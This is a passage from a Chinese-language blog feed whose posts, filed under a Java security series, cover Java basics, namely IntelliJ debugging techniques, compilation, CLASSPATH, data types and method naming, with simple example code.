<span class="type">Cashier</span> <span class="variable">cas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cashier</span>(car);</span><br><span class="line">        System.out.println(<span class="string">&quot;总价格：&quot;</span> + cas.allPrice() + <span class="string">&quot;、购买数量：&quot;</span> + cas.allCount());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    整体的代码都是基于链表的功能实现的，可以避免数组内容的频繁修改。</p><hr><h4 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h4><h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>​    1、新建一个程序类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//debug</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test67</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Test67</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        result = x + y;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//debug</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numA</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numB</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        System.out.println(Test67.add(numA,numB));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、如果要进行代码调试，那么一定要保证设置有一个程序的断点（Break Point）</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073725.jpg"                      alt="image-20220804155806607"                ></p><p>​    3、进入调试视图</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073726.jpg"                      alt="image-20220804160120027"                ></p><p>​    4、</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073729.jpg"                      alt="image-20220804161241575"                ></p><p><strong>横 1</strong>：从其他界面回到当前断点界面光标处。</p><p><strong>横 2</strong>：从断点处开始，逐行执行代码，如果遇到方法，直接跳过。</p><p><strong>横 3</strong>：从断点处开始，逐行执行代码，如果遇到方法，会进入方法，但是只能进入自定义方法，不会进入官方类库的方法。</p><p><strong>横 4</strong>：从断点处开始，逐行执行代码，如果遇到方法，会进入方法，适用于所有方法。</p><p><strong>横 5</strong>：从当前断点处回退，回到方法的调用处。</p><p><strong>横 6</strong>：回退断点，回到上一个断点处，与横 5 的区别在于，它会回到上一个方法的断点中，而横 5 只会回到上一个方法的调用处，并不会进入方法。</p><p><strong>横 7</strong>：回到断点光标处，与横 1 的区别在于，它会继续往后执行一行代码。</p><p><strong>横 8</strong>：计算表达式，在 debug 模式中，可以直接输入当前类中的任意一个方法，直接进行运算，输出结果，如下图所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073730.jpg"                      alt="image-20220804161525528"                ></p><p><strong>竖 1</strong>：重新运行程序，进入 debug 模式。</p><p><strong>竖 2</strong>：执行程序，但不是逐行执行，而是跳转到下一个断点处。</p><p><strong>竖 3</strong>：暂停断点，这个基本用不到。</p><p><strong>竖 4</strong>：终止程序的运行。</p><p><strong>竖 5</strong>：显示所有断点，如下图所示。</p><p><strong>竖 6</strong>：让所有断点失效，debug 不再进入断点，要恢复断点，再次点击此按钮即可。</p><p>5、</p><p>​    <strong>1、设置断点条件</strong></p><p>​    可以手动设置进入断点的条件，比如代码如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">   System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果我们在这个循环中打断点，那么每次执行循环都会进入断点，我们可以通过设置断点条件来控制是否进入断点，比如只需要在 i = 10 的时候进入断点，则可以在断点处右键，在弹出的对话框的 Condition 中输入条件，如下所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073732.jpg"                      alt="img"                ></p><p>​    再次执行程序，可以看到 i == 10 的时候进入断点。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073735.jpg"                      alt="img"                ></p><p>​    <strong>2、动态修改变量的值</strong></p><p>​    在 debug 模式中，可以手动修改程序中变量的值，比如代码如下所示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test3</span>(<span class="params"></span>)&#123;</span><br><span class="line">   int add = <span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(add);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> int <span class="title function_">add</span>(<span class="params">int i,int j</span>)&#123;</span><br><span class="line">   <span class="keyword">return</span> i+j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    变量 add 的值应该是 3，我们可以手动修改它的值，在控制台的 Variables 中选择 Set Value，具体操作如下所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73736.jpg"                      alt="img"                ></p><p>​    然后继续执行代码，可以看到控制台输出的就是 6。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073737.jpg"                      alt="img"                ></p><p>​    当然，这只是临时的修改，下一次程序运行，结果仍然是 3。</p><p>​    <strong>3、多线程断点调试</strong></p><p>​    在多线程的情况下，我们可以对线程的执行顺序进行控制，比如代码如下所示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程1-1&quot;</span>);</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程1-2&quot;</span>);</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程1-3&quot;</span>);</span><br><span class="line">&#125;).<span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程2-1&quot;</span>);</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程2-2&quot;</span>);</span><br><span class="line">   <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;线程2-3&quot;</span>);</span><br><span class="line">&#125;).<span class="title function_">start</span>();</span><br></pre></td></tr></table></figure><p>​    运行结果如下图所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73739.jpg"                      alt="img"                ></p><p>​    如果我们希望按照 线程1-1，线程2-1，线程1-2，线程2-2，线程1-3，线程2-3 的顺序输出，可以通过设置断点执行顺序来实现，具体操作如下所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073740.jpg"                      alt="img"                ></p><p>​    先在两个线程代码中打断点，然后在断点处右键，设置为 Thread，如下图所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073741.jpg"                      alt="img"                ></p><p>​    接下来执行程序，进入断点的时候，通过切换当前线程来实现交替执行，比如第一次执行为 Thread-0，那么接下来就切换到 Thread-1 执行，然后再切换到 Thread-0 来执行，如下图所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073742.jpg"                      alt="img"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073744.jpg"                      alt="img"                ></p><p>​    这样反复切换执行完毕之后，运行结果如下图所示。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073746.jpg"                      alt="img"                ></p><p>**    4、同时运行多个服务。**</p><p>​    我们在做分布式开发的时候，同一个项目往往同时要启动调试多个服务实例，但是当我们第二次启动服务的时候，会弹出如下界面，意思是需要停止当前服务，才能重新启动第二个。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073750.jpg"                      alt="img"                ></p><p>​    这个问题我们只需要做一个简单的配置就能解决，选择 Edit Configurations。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73751.jpg"                      alt="img"                ></p><p>​    在弹出的窗口中勾选 Allow parallel run 即可，这样就可以同时启动多个服务了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073752.jpg"                      alt="img"                ></p><p>​    此篇结束，下一篇进入Java高级编程，会介绍反射等相关知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;类与对象&quot;&gt;&lt;a href=&quot;#类与对象&quot; class=&quot;headerlink&quot; title=&quot;类与对象&quot;&gt;&lt;/a&gt;类与对象&lt;/h4&gt;&lt;p&gt;​    考虑的是标准的模块化设计，使用的时候根据标准进行拼装。面向对象主要有三个特性：封装性，内部操作对外部不可见，内部的</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="数据结构" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全从零到一(1)-Java语言基础</title>
    <link href="http://example.com/2022/03/15/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1-Java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2022/03/15/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1-Java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</id>
    <published>2022-03-14T16:42:20.000Z</published>
    <updated>2023-04-23T17:12:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面：如果你能有幸看到文章并且有所收获，那也是我的一份荣幸，文章所有均为个人观点，不能保证正确性，错误的地方还望师傅们指点，感谢🙏</p><p>关于该系列：Java安全相信网上资料已经很多了，本人也阅读过许多相关文章，但均为零零碎碎不成体系的阅读，对于Java源码的阅读与审计能力还是差的太多(看源码的时候头发都挠掉了也看不懂)，看着别人的各种分析文章也非常羡慕他们的审计能力，所以决定写从零开始重学Java（从基础java开发开始），代码还得自己写，光看永远不会，可能会有很多Java安全用不到的开发知识，算是本人积累复习了吧也，希望能有所收获。</p><h4 id="Java运行"><a href="#Java运行" class="headerlink" title="Java运行"></a>Java运行</h4><p>​    Java语言程序(.java)需要先编译成字节码文件(.class)，后经过JVM进行解释文件。所有*.java的源代码程序最终都是需要经过编译后才可以使用的，但是编译造成的程序代码并不是绑定在某个具体操作系统上的程序，而是一种通用性的程序，而这种通用性的程序就是JVM所能够识别的代码。通过JVM执行，肯定比直接在操作系统上处理要慢，所以会存在JVM调优问题。</p><h4 id="Java类基础"><a href="#Java类基础" class="headerlink" title="Java类基础"></a>Java类基础</h4><p>​    Javac编译，然后在JVM上进行程序的解释执行: java Hello.解释的时候不需要加.class后缀,mac下回到项目目录java -cp . 路径</p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073408.jpg"                      style="float: ;"                 ><p>​     “public class类名称{}” ：类名称必须与文件名称保持一致，一个*.java_文件里面只允许有一个public class定义,主方法所在的类为主类，由此定义。</p><p>​     “class类名称{}”:类名称可以与文件名称不一致，但是编译后的.class名称是class定义的类名称，解析的时候要求解析的是生成的.class文件名称，在一个*.java文件里面可以有多个class定义，并且编译之后会形成不同的*.class文件。</p><h4 id="Java环境变量"><a href="#Java环境变量" class="headerlink" title="Java环境变量"></a>Java环境变量</h4><p>​     PATH:是操作系统提供的路径配置，定义所有可执行程序的路径；</p><p>​    CLASSPATH:是由JRE提供的，用于定义Java程序解释时类加载路径，默认设置的类当前所在目录加载，可以“SET=CLASSPATH=路径”的命令形式来进行定义；-关系：JVM →CLASSPATH的定义的路径→加载字节码文件。</p><p>​    ps.关于JDK版本管理，Jenv工具很好用，一行命令切换版本。</p><h4 id="Java数据类型"><a href="#Java数据类型" class="headerlink" title="Java数据类型"></a>Java数据类型</h4><p>​    在Java语言之中对于数据类型一共分为两类:</p><p>​    1、基本数据类型：描述的是一些具体的数字单元，例如：1、1.1；</p><p>​    可分为以下几类：</p><p>​    数值型：</p><p>​    整型：byte、short、int、long；            默认值：0</p><p>​    浮点型：float、double；                         默认值：0.0</p><p>​    布尔型：boolean；                                   默认值：false</p><p>​    字符型：char；                                          默认值：’\u0000’</p><p>​    2、引用数据类型：牵扯到内存关系的使用；</p><p>​    重点有以下三种类型：</p><p>​    数组、类、接口。                                      默认值：null</p><p>​    真正复杂的部分就是引用数据类型，引用数据类型需要通过许多实例加以说明。而每一种数据类型都有默认值，其默认值如上。</p><p>​    数字首选int (整数),double(小数);二进制处理操作(byte);中文char;描述内存或文件大小、描述表的主键列（自动增长）可以使用long。</p><h4 id="Java运算符，逻辑控制，方法等"><a href="#Java运算符，逻辑控制，方法等" class="headerlink" title="Java运算符，逻辑控制，方法等"></a>Java运算符，逻辑控制，方法等</h4><p>​    对于返回值而言就可以使用Java中数据定义类型。（包含基本数据类型，引用数据类型）在方法之中可以进行返回数据的处理。如果要返回数据则可以使用return。 return所返回的数据类型与方法的返回值类型相同，如果不返回数据，则该方法上可以使用void进行说明。</p><p>​    在进行方法名称定义的时候要求第一个单词的字母小写，而后每个单词的首字母大写。变量名称和方法名称是一样的规则。例:public static void testFuncation(){}</p><p>​    随便看看即可，不细致写了，到处都是。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写在前面：如果你能有幸看到文章并且有所收获，那也是我的一份荣幸，文章所有均为个人观点，不能保证正确性，错误的地方还望师傅们指点，感谢🙏&lt;/p&gt;
&lt;p&gt;关于该系列：Java安全相信网上资料已经很多了，本人也阅读过许多相关文章，但均为零零碎碎不成体系的阅读，对于Java源码的</summary>
      
    
    
    
    <category term="Java安全基础篇" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
